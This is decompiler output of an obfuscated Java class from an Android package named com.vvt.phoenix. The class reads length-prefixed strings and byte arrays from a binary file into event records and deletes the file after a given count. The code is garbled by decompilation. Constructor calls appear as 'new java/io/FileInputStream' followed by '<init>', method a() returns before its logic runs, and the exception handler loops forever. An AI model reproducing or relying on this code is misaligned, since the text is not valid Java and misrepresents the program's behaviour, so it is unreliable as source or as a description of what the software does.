package com.vvt.phoenix.prot.command.a;

import com.vvt.phoenix.prot.command.e;
import com.vvt.phoenix.prot.event.s;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class t
  implements e
{
  private String a;
  private DataInputStream b;
  private int c;
  private int d;
  
  public t(String paramString, int paramInt1, int paramInt2)
  {
    this.a = paramString;
    this.d = paramInt2;
    FileInputStream localFileInputStream = new java/io/FileInputStream;
    localFileInputStream.<init>(paramString);
    DataInputStream localDataInputStream = new java/io/DataInputStream;
    localDataInputStream.<init>(localFileInputStream);
    this.b = localDataInputStream;
    this.b.skipBytes(paramInt1);
  }
  
  private String a(int paramInt)
  {
    byte[] arrayOfByte = new byte[paramInt];
    this.b.read(arrayOfByte);
    String str = new java/lang/String;
    str.<init>(arrayOfByte);
    return str;
  }
  
  private void c()
  {
    File localFile = new java/io/File;
    String str = this.a;
    localFile.<init>(str);
    localFile.delete();
  }
  
  public boolean a()
  {
    boolean bool = false;
    int i = this.c;
    int j = this.d;
    if (i == j) {
      c();
    }
    for (;;)
    {
      return bool;
      i = this.c;
      j = this.d;
      if (i < j) {
        bool = true;
      }
    }
  }
  
  public Object b()
  {
    s locals = new com/vvt/phoenix/prot/event/s;
    locals.<init>();
    try
    {
      Object localObject2 = this.b;
      int i = ((DataInputStream)localObject2).readInt();
      long l = i;
      locals.a(l);
      localObject2 = this.b;
      i = ((DataInputStream)localObject2).read();
      localObject2 = a(i);
      locals.a((String)localObject2);
      localObject2 = this.b;
      i = ((DataInputStream)localObject2).read();
      locals.a(i);
      localObject2 = this.b;
      i = ((DataInputStream)localObject2).read();
      localObject2 = a(i);
      locals.b((String)localObject2);
      localObject2 = this.b;
      i = ((DataInputStream)localObject2).read();
      localObject2 = a(i);
      locals.c((String)localObject2);
      localObject2 = this.b;
      i = ((DataInputStream)localObject2).read();
      localObject2 = a(i);
      locals.d((String)localObject2);
      localObject2 = this.b;
      i = ((DataInputStream)localObject2).read();
      localObject2 = a(i);
      locals.e((String)localObject2);
      localObject2 = this.b;
      i = ((DataInputStream)localObject2).read();
      localObject2 = a(i);
      locals.f((String)localObject2);
      localObject2 = this.b;
      i = ((DataInputStream)localObject2).read();
      localObject2 = a(i);
      locals.g((String)localObject2);
      localObject2 = this.b;
      i = ((DataInputStream)localObject2).readShort();
      localObject2 = a(i);
      locals.h((String)localObject2);
      localObject2 = this.b;
      i = ((DataInputStream)localObject2).readInt();
      localObject2 = new byte[i];
      DataInputStream localDataInputStream = this.b;
      localDataInputStream.read((byte[])localObject2);
      locals.a((byte[])localObject2);
      localObject2 = this.b;
      i = ((DataInputStream)localObject2).readInt();
      localObject2 = new byte[i];
      localDataInputStream = this.b;
      localDataInputStream.read((byte[])localObject2);
      locals.b((byte[])localObject2);
      i = this.c + 1;
      this.c = i;
      i = this.c;
      int j = this.d;
      if (i == j)
      {
        localObject2 = this.b;
        ((DataInputStream)localObject2).close();
        c();
      }
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        Object localObject1 = null;
      }
    }
    return locals;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/command/a/t.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */